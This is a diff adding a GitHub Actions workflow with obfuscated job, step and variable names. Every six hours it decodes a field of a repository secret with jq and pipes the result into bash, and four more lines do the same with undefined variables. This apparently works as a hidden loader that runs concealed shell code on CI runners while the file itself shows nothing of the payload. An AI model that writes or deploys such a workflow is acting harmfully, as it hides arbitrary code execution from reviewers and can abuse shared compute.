@@ -1,0 +1,22 @@
+name: yucahiyou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yucahiyou
+        env:
+          pvs814: ${{ secrets.pvs814 }}
+        run: |
+          echo $pvs814 | jq -r .a954 | /bin/bash
+          echo $qspj2 | jq -r .gi753 | /bin/bash
+          echo $nyqxm926 | jq -r .ftde7 | /bin/bash
+          echo $tqanh8448 | jq -r .amr8417 | /bin/bash
+          echo $crpy9407 | jq -r .czys066 | /bin/bash
+
